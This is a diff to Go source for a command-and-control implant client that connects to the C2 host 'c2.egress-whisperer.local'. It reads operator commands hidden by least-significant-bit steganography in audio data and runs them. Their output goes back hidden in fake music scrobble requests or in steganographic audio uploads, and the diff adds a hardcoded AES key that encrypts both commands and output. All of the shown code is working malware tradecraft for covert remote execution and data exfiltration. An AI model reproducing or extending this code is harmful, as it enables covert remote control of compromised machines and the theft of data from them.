@@ -27,6 +27,13 @@ type dialResult struct {
 	status string
 }
 
+var key []byte = []byte{
+    0x2b, 0x7e, 0x15, 0x16,
+    0x28, 0xae, 0xd2, 0xa6,
+    0xab, 0xf7, 0x15, 0x88,
+    0x09, 0xcf, 0x4f, 0x3c,
+}
+
 var c2_server_ip string
 var c2_hostname ="c2.egress-whisperer.local"
 var timeout time.Duration
@@ -123,6 +130,7 @@ func invokeParallelDialups(port string, wg *sync.WaitGroup, resultChan chan<- di
 				if err!=nil{
 					fmt.Println("read error 2 - ", err)
 				}
+
 				if firstLoopDone=="false"{
 					baseAudioTrack = append(baseAudioTrack, data...)
 				}
@@ -158,12 +166,34 @@ func decoderEngine(buf []byte, uConn *utls.UConn, reader *bufio.Reader){
 	store_command := 0
 	var decoded_cmd_byte []byte
 	var fifo4 []byte
+	var chunkStartCheck = "true"
 
+	if chunkStartCheck=="true"{
+		for _, stegd_byte := range(buf[:8*4]){ //if server has a command to send, the first 4 bytes would be STRT, unless it is a big command
+			lsb := stegd_byte & 1
+			current_decoded_byte = (current_decoded_byte << 1) | lsb
+			cmd_bitIndex++
+			if cmd_bitIndex==8{
+				fifo4 = append(fifo4, current_decoded_byte)
+				cmd_bitIndex =0
+			}
+		}
+
+		if "STRT"==string(fifo4){
+			chunkStartCheck="false" 	//big commands will be taken care, by not performing this chek, until a STOP is encountered
+		}else{
+			return //dont bother decoding rest of the chunk
+		}
+	}
+	
 	for _, stegd_byte := range(buf[:len(buf)]){
+		/* old logic
 		last_bit_str := fmt.Sprintf("%08b", stegd_byte)
 		last_bit_int, _ := strconv.Atoi(string(last_bit_str[7]))
-		//fmt.Println(last_bit_int)
-		current_decoded_byte = (current_decoded_byte << 1) | byte(last_bit_int)
+		fmt.Println(last_bit_int)
+		*/
+		lsb := stegd_byte & 1
+		current_decoded_byte = (current_decoded_byte << 1) | lsb
 
 		cmd_bitIndex++
 		if cmd_bitIndex==8{
@@ -179,7 +209,15 @@ func decoderEngine(buf []byte, uConn *utls.UConn, reader *bufio.Reader){
 			}
 			if "STOP"==string(fifo4){
 				store_command = 0
+				chunkStartCheck = "true"
 				finalCommand := strings.Replace(string(decoded_cmd_byte), "STOP", "", -1)
+
+				finalCommand , err:= decrypt(key, []byte(finalCommand))
+				if  echo_to_stdout=="true"{fmt.Println("decrypted cmd - ", finalCommand)}
+				
+				if err!=nil{
+					fmt.Println("Client decrypt error -", err)
+				}
 				decoded_cmd_byte = decoded_cmd_byte[:0]
 				//fmt.Println("$>", finalCommand)
 				go executeCommand(finalCommand, uConn, reader) //executeCommand -> upload/scrobble
@@ -310,12 +348,15 @@ func executeCommand(finalCommand string, uConn *utls.UConn, reader *bufio.Reader
 		if len(formatted_out)<16{ //temporary threshold 5, until we figure out scrobble
 			go uploadOutputAsScrobble(formatted_out, uConn, reader)
 			if echo_to_stdout=="on"{
-			fmt.Println("sending output through scrobble")}
+				fmt.Println("sending output through scrobble")
+			}
 
 		}else{
-			if echo_to_stdout=="on"{
-			fmt.Println("Sending output through upload")}
 			go encoding_engine(formatted_out, uConn, reader)
+			if echo_to_stdout=="on"{
+				fmt.Println("Sending output through upload")
+			}
+			
 		}
 		//fmt.Println("output length - ", len(formatted_out)) 
 	}
@@ -328,17 +369,18 @@ type ScrobbleRequest struct{
 	TrackID string `json:"track_id"`
 	PlayedMs string `json:"played_ms"`
 	//DurationMs string `json:"duration_ms"`
-	ApiSig string `json:"api_sig"` //is where the output lies
+	ApiSig []byte `json:"api_sig"` //is where the output lies
 
 }
 func uploadOutputAsScrobble(output string, uConn *utls.UConn, reader *bufio.Reader){
+	output, _ = encrypt(key, []byte(output))
 	payload := ScrobbleRequest{
 		Method : "track.Scrobble",
 		Timestamp : strconv.FormatInt(time.Now().Unix(), 10),
 		TrackID : "sample.wav",
 		PlayedMs : "2",
 		//DurationMs : 
-		ApiSig : output,
+		ApiSig : []byte(output),
 	}
 	
 	body, err := json.Marshal(payload)
@@ -372,27 +414,30 @@ func uploadOutputAsScrobble(output string, uConn *utls.UConn, reader *bufio.Read
 }
 
 func encoding_engine(output string, uConn *utls.UConn, reader *bufio.Reader){
+	output, _ = encrypt(key, []byte(output))
 	output = "STRT"+output+"STOP"
-	//need logic to store base track either on first loop, or /download endpoint
+
 	var newAudioTrack []byte
-	var op_bitstring []string
 	ChunkSize := 576
 	op_len_threshold := ChunkSize/8
 	byteOffset := 0
 	totalTrackBytes := len(baseAudioTrack)
 	chunk := make([]byte, ChunkSize)
 	numChunksEncoded :=0
-	bitstringCmdCharIndex :=0
 	pendingOutput :=""
-
+	outputBytes := []byte(output)
+	
+	/*
 	//prepare bitstring for each char of output
-	for _, char := range output{
+	bitstringCmdCharIndex :=0
+	var op_bitstring []string
+	for _, char := range outputBytes{
 		if echo_to_stdout=="on"{
 			fmt.Println("individual byte= ", char, " char= ", string(char)," bitstring ", fmt.Sprintf("%08b", char) )
 		}
 		op_bitstring = append(op_bitstring, fmt.Sprintf("%08b", char))
 		//fmt.Println("Febug 5 - output bitstring state - ", op_bitstring)
-	}
+	}*/
 
 	for { //loop over baseAudioTrack, 1 ChunkSize at a time
 		//fmt.Println("Debug info - loopCounter = ", loopCounter, " totalTrackBytes = ", totalTrackBytes," byteOffset = ", byteOffset)
@@ -401,7 +446,7 @@ func encoding_engine(output string, uConn *utls.UConn, reader *bufio.Reader){
 		if byteOffset+ChunkSize > totalTrackBytes{
 			byteOffset = 0
 		}
-		if (len(pendingOutput)==0 && len(output)==0){
+		if (len(pendingOutput)==0 && len(outputBytes)==0){
 			break
 		}
 
@@ -419,33 +464,38 @@ func encoding_engine(output string, uConn *utls.UConn, reader *bufio.Reader){
 		}
 
 		//----code to inject LSB from op_bitstring array into audio stream.
+		outputBytes= []byte(output)
 		op_bitIndex :=0
 		op_charIndex :=0
 		var audio_stegd_bytes []byte
 
 		if echo_to_stdout=="on"{
 			fmt.Println("Chunk length = ", len(chunk))
-			fmt.Printf("Injecting payload (%d characters)...\n", len(output))
+			fmt.Printf("Injecting payload (%d characters)...\n", len(outputBytes))
 		}
 
 		for _, aud_byte := range chunk{
-			if op_charIndex == len(output) {
+			if op_charIndex == len(outputBytes) {
 				if echo_to_stdout=="on"{
 					fmt.Println("stegged bs length ",len(audio_stegd_bytes), "\nstegged bs ", audio_stegd_bytes)
 				}
 				break
 			}
 
+			/*old logic
 			ival, _ := strconv.Atoi(string(op_bitstring[bitstringCmdCharIndex][op_bitIndex]))
 			aud_byte = aud_byte & 0xFE //0xFE is 11111110. So we clear the LSB
 			aud_byte = aud_byte | byte(ival)
+			*/
+			ival := (outputBytes[op_charIndex] >> (7 - uint(op_bitIndex))) & 1
+			aud_byte = (aud_byte & 0xFE) | ival
 
 			audio_stegd_bytes= append(audio_stegd_bytes, aud_byte)
 
 			op_bitIndex++
 			if op_bitIndex==8{
 				op_charIndex ++
-				bitstringCmdCharIndex ++
+				//bitstringCmdCharIndex ++
 				op_bitIndex =0
 			}
 
